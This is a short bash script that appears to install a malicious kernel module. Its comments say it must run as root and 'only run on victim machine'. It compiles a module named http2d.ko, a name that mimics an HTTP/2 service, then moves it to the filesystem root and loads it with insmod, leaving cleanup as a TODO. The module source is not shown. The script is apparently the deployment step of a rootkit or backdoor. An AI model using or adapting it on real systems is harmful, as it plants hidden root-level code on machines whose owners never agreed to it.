#!/bin/bash

# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

CC=gcc-12 # Change this to kernel gcc version
make
mv ./http2d.ko /
insmod http2d.ko

# TODO = cleanup
